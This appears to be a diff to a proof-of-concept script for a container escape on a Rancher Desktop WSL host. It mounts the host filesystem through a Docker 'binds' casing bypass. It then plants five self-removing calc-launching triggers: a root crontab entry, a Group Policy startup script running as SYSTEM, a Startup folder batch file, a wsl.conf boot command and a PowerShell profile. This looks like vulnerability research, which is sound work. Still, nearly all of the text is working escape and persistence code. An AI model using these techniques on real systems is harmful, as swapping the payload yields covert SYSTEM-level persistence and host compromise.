@@ -181,11 +181,13 @@ echo "wrote proof (host) $P"'
 # ── Finding #1 (fs): filesystem-only calc pop — multi-vector ──────────────────
 # No privileged, no pidmode, no nsenter. Mount host rootfs via the 1b-style
 # bypass (lowercase `binds` under properly-cased `HostConfig`).
-# Host is Rancher Desktop WSL distro: crond runs /etc/periodic/15min every 15m,
-# binfmt_misc WSLInterop is registered (flags: P). Three trigger mechanisms:
-#   1. crond /etc/periodic/15min — fires within 15 min, no user interaction
-#   2. Windows Startup folder   — fires on next Windows logon
-#   3. PowerShell profile       — fires on next terminal (if profile dir exists)
+# Host is Rancher Desktop WSL distro (Alpine/OpenRC, busybox crond).
+# Five trigger mechanisms, fastest first:
+#   1. /etc/crontabs/root + cron.update — 60-120 sec (busybox crond re-read)
+#   2. GP Machine Startup scripts.ini  — next Windows boot, as SYSTEM
+#   3. Windows user Startup folder     — next Windows logon
+#   4. /etc/wsl.conf [boot] command=   — next WSL distro start
+#   5. PowerShell profile injection    — next PS/Terminal session (if dir exists)
 # All payloads self-remove after first execution.
 fs)
   pull
@@ -194,29 +196,65 @@ echo "[*] host rootfs at /host — deploying calc-pop triggers ..."
 MARKER="HUDDLE_POC_CALCPOP"
 TRIGGERED=0
 
-# ── 1) crond periodic job (fires within <=15 min, no user interaction needed)
-# Rancher Desktop WSL runs crond with /etc/periodic/15min. binfmt_misc
-# WSLInterop is registered (flags:P), so cmd.exe works natively from here.
-CRONDIR="/host/etc/periodic/15min"
-if [ -d "$CRONDIR" ]; then
-  CRONSCRIPT="$CRONDIR/huddle-poc-calcpop"
-  cat > "$CRONSCRIPT" << "CRONEOF"
+# ── 1) busybox crond: every-minute crontab + cron.update signal [60-120 sec]
+# busybox crond polls /etc/crontabs/ directory mtime every 60s. Writing to an
+# existing file does NOT bump dir mtime — must create cron.update signal file
+# (what `crontab -e` does internally). crond reads it on next tick, re-scans
+# the named user crontab, then deletes the signal file.
+CRONTAB="/host/etc/crontabs/root"
+if [ -d "/host/etc/crontabs" ]; then
+  # Write the payload script to host /tmp
+  cat > /host/tmp/huddle-poc-calc.sh << "CALCEOF"
 #!/bin/sh
-# HUDDLE_POC_CALCPOP — self-removing PoC (fires once via crond, then deletes)
+# HUDDLE_POC_CALCPOP — fires once via crond, then self-cleans
 export WSL_INTEROP="$(ls /run/WSL/*_interop 2>/dev/null | head -1)"
 if [ -n "$WSL_INTEROP" ]; then
   /mnt/c/Windows/System32/cmd.exe /c start calc >/dev/null 2>&1 &
 fi
-rm -f "$0"
-CRONEOF
-  chmod +x "$CRONSCRIPT"
-  echo "[+] wrote $CRONSCRIPT (crond fires within 15 min, self-deletes)"
+# Self-cleanup: remove crontab entry and this script
+sed -i "/huddle-poc-calc/d" /etc/crontabs/root 2>/dev/null
+echo root > /etc/crontabs/cron.update
+rm -f /tmp/huddle-poc-calc.sh
+CALCEOF
+  chmod +x /host/tmp/huddle-poc-calc.sh
+  # Preserve existing crontab, prepend every-minute trigger
+  if [ -f "$CRONTAB" ]; then
+    ORIG=$(cat "$CRONTAB")
+    printf "* * * * * /tmp/huddle-poc-calc.sh\n%s\n" "$ORIG" > "$CRONTAB"
+  else
+    echo "* * * * * /tmp/huddle-poc-calc.sh" > "$CRONTAB"
+  fi
+  # Signal crond to re-read NOW (not wait for dir mtime poll)
+  echo root > /host/etc/crontabs/cron.update
+  echo "[+] wrote crontab entry + cron.update signal (fires in 60-120 sec, self-cleans)"
   TRIGGERED=$((TRIGGERED + 1))
 else
-  echo "[!] no /etc/periodic/15min — crond path unavailable"
+  echo "[!] no /etc/crontabs/ — busybox crond path unavailable"
 fi
 
-# ── 2) Windows Startup folder (fires on next Windows logon)
+# ── 2) GP Machine Startup script [next Windows boot, runs as SYSTEM]
+# Group Policy machine startup scripts fire before user logon.
+# No domain/AD required — local GPO works on standalone machines.
+GPDIR="/host/mnt/c/Windows/System32/GroupPolicy/Machine/Scripts/Startup"
+GPINI="/host/mnt/c/Windows/System32/GroupPolicy/Machine/Scripts/scripts.ini"
+if [ -d "/host/mnt/c/Windows/System32/GroupPolicy" ]; then
+  mkdir -p "$GPDIR" 2>/dev/null
+  cat > "$GPDIR/huddle-poc.bat" << "GPEOF"
+@echo off
+rem HUDDLE_POC_CALCPOP — GP Machine Startup, self-deleting
+start calc
+(goto) 2>nul & del "%~f0"
+GPEOF
+  # scripts.ini must use CRLF
+  printf "[Startup]\r\n0CmdLine=huddle-poc.bat\r\n0Parameters=\r\n" > "$GPINI"
+  echo "[+] wrote GP Machine Startup ($GPDIR/huddle-poc.bat + scripts.ini)"
+  echo "    fires on next Windows boot as SYSTEM, before user logon, self-deletes"
+  TRIGGERED=$((TRIGGERED + 1))
+else
+  echo "[!] no GroupPolicy dir — GP Startup path unavailable"
+fi
+
+# ── 3) Windows Startup folder [next Windows user logon]
 for userdir in /host/mnt/c/Users/*/; do
   user=$(basename "$userdir")
   case "$user" in Public|Default|Default\ User|All\ Users) continue;; esac
@@ -234,7 +272,26 @@ BATEOF
   break
 done
 
-# ── 3) PowerShell profile (fires on next PS/Terminal/VS Code terminal)
+# ── 4) /etc/wsl.conf [boot] command= [next WSL distro start]
+WSLCONF="/host/etc/wsl.conf"
+if ! grep -q "huddle-poc" "$WSLCONF" 2>/dev/null; then
+  cat > /host/tmp/huddle-poc-boot.sh << "BOOTEOF"
+#!/bin/sh
+# HUDDLE_POC_CALCPOP — wsl.conf boot command, fires once, then self-cleans
+export WSL_INTEROP="$(ls /run/WSL/*_interop 2>/dev/null | head -1)"
+if [ -n "$WSL_INTEROP" ]; then
+  /mnt/c/Windows/System32/cmd.exe /c start calc >/dev/null 2>&1 &
+fi
+sed -i "/huddle-poc/d" /etc/wsl.conf 2>/dev/null
+rm -f /tmp/huddle-poc-boot.sh
+BOOTEOF
+  chmod +x /host/tmp/huddle-poc-boot.sh
+  printf "\n[boot]\ncommand=/tmp/huddle-poc-boot.sh # huddle-poc\n" >> "$WSLCONF"
+  echo "[+] appended [boot] command to wsl.conf (fires on next WSL distro start, self-cleans)"
+  TRIGGERED=$((TRIGGERED + 1))
+fi
+
+# ── 5) PowerShell profile (fires on next PS/Terminal/VS Code terminal)
 for userdir in /host/mnt/c/Users/*/; do
   user=$(basename "$userdir")
   case "$user" in Public|Default|Default\ User|All\ Users) continue;; esac
@@ -255,6 +312,7 @@ echo ""
 echo "[*] proof: host /etc/hostname = $(cat /host/etc/hostname 2>/dev/null)"
 if [ "$TRIGGERED" -gt 0 ]; then
   echo "[+] deployed $TRIGGERED trigger(s). All self-remove after first execution."
+  echo "[*] fastest path: crontab fires in 60-120 sec (no user interaction needed)"
 else
   echo "[!] no trigger paths found — writing proof file instead"
   echo "HUDDLE HOST-ESCAPE PoC — filesystem write confirmed" > /host/tmp/huddle-poc-proof.txt
